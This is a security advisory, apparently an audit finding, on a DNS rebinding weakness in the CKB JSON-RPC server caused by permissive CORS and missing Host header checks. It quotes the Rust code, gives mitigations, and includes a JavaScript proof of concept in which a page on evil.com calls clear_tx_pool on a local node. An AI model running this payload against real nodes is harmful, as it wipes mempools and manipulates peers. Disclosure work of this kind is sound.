### Title
Unauthenticated JSON-RPC Interface Vulnerable to DNS Rebinding via `CorsLayer::permissive()` and Missing Host Header Validation - (File: `rpc/src/server.rs`)

---

### Summary

The CKB JSON-RPC HTTP server applies `CorsLayer::permissive()` and performs no `Host` header validation. A browser-based DNS rebinding attack allows an attacker-controlled web page to issue arbitrary, unauthenticated JSON-RPC calls to a locally running CKB node, enabling transaction injection, peer manipulation, mining interference, and transaction pool clearing.

---

### Finding Description

In `rpc/src/server.rs`, the `start_server` function constructs the axum `Router` and applies middleware:

```rust
let app = Router::new()
    .route("/", method_router.clone())
    .route("/{*path}", method_router)
    .route("/ping", get(ping_handler))
    .layer(Extension(Arc::clone(rpc)))
    .layer(CorsLayer::permissive())   // ← wildcard CORS, no origin restriction
    .layer(TimeoutLayer::with_status_code(...))
    .layer(Extension(stream_config));
``` [1](#0-0) 

`CorsLayer::permissive()` from `tower-http` responds to every CORS preflight with `Access-Control-Allow-Origin: *` (or mirrors the requesting origin) and permits all methods and headers. No middleware or handler inspects or validates the HTTP `Host` header at any point in the request pipeline. [2](#0-1) 

The `handle_jsonrpc` handler reads only the raw request body bytes and dispatches directly to the JSON-RPC method router with no origin, referrer, or host check: [3](#0-2) 

The `RpcConfig` struct has no field for allowed origins or host allowlists: [4](#0-3) 

The default configuration binds to `127.0.0.1:8114` and enables the `Net`, `Pool`, `Miner`, `Chain`, `Stats`, `Subscription`, `Experiment`, and `Terminal` modules — all without authentication: [5](#0-4) 

---

### Impact Explanation

A successful DNS rebinding attack gives the attacker full, unauthenticated access to every enabled RPC module. Concrete consequences include:

- **`send_transaction`** (Pool module): inject arbitrary transactions into the node's mempool and broadcast them to the network.
- **`submit_block`** (Miner module): submit attacker-crafted blocks, disrupting the node operator's mining revenue.
- **`get_block_template`** (Miner module): read the current block template, leaking pending transaction data.
- **`set_ban` / `add_node` / `remove_node`** (Net module): isolate the node from honest peers or force connections to attacker-controlled peers, enabling eclipse-attack preconditions.
- **`clear_tx_pool`** (Pool module): silently drop all pending transactions, causing denial of service for users relying on this node.
- **`send_alert`** (Alert module, if enabled): broadcast forged network alerts to all connected peers.

---

### Likelihood Explanation

DNS rebinding is a well-documented, browser-executable attack requiring only that the victim visit a malicious web page while running a CKB node. No special privileges, leaked keys, or social engineering beyond a single page visit are required. The default `127.0.0.1:8114` binding is the standard configuration shipped to all users. The attack is feasible against any CKB node operator who uses a browser on the same machine as their node — a common scenario for developers, miners, and home node operators.

---

### Recommendation

1. **Validate the `Host` header** in a middleware layer before dispatching to any RPC handler. Accept only `localhost`, `127.0.0.1`, `[::1]`, and the configured listen address. Reject all other values with `400 Bad Request`. This is the primary mitigation: DNS rebinding relies on the server accepting a request whose `Host` is an attacker-controlled FQDN that has been re-pointed to `127.0.0.1`.

2. **Replace `CorsLayer::permissive()` with a restrictive policy**. For a localhost-only service, CORS should either be disabled entirely or restricted to an explicit allowlist (e.g., `null` origin for local file pages, or no CORS at all). `CorsLayer::permissive()` actively assists the attack by approving every preflight.

3. **Add an optional token-based authentication header** (e.g., a bearer token set in `ckb.toml`) so that even if a request reaches the handler, it cannot be forged by a browser script that cannot read or set arbitrary headers.

---

### Proof of Concept

**Setup:** Node running with default config (`127.0.0.1:8114`, Pool module enabled).

**Attack steps:**

1. Attacker registers `evil.com` with a very short DNS TTL (e.g., 1 second), initially pointing to their own server at `1.2.3.4`.
2. Victim visits `http://evil.com:8114/`. Attacker's server serves a page with JavaScript that polls a known endpoint.
3. Attacker's DNS TTL expires; `evil.com` is re-pointed to `127.0.0.1`.
4. Browser DNS cache expires. The JavaScript now issues:

```javascript
fetch("http://evil.com:8114/", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    id: 1,
    jsonrpc: "2.0",
    method: "clear_tx_pool",
    params: []
  })
}).then(r => r.json()).then(console.log);
```

5. The browser resolves `evil.com` → `127.0.0.1`, sends the POST to `127.0.0.1:8114` with `Host: evil.com:8114`.
6. The CORS preflight is answered with `Access-Control-Allow-Origin: *` by `CorsLayer::permissive()`.
7. The server's `handle_jsonrpc` handler receives the request, finds no `Host` validation, and dispatches `clear_tx_pool` — the node's mempool is wiped.

The same technique applies to `send_transaction`, `set_ban`, `submit_block`, and all other enabled RPC methods. [1](#0-0) [6](#0-5)
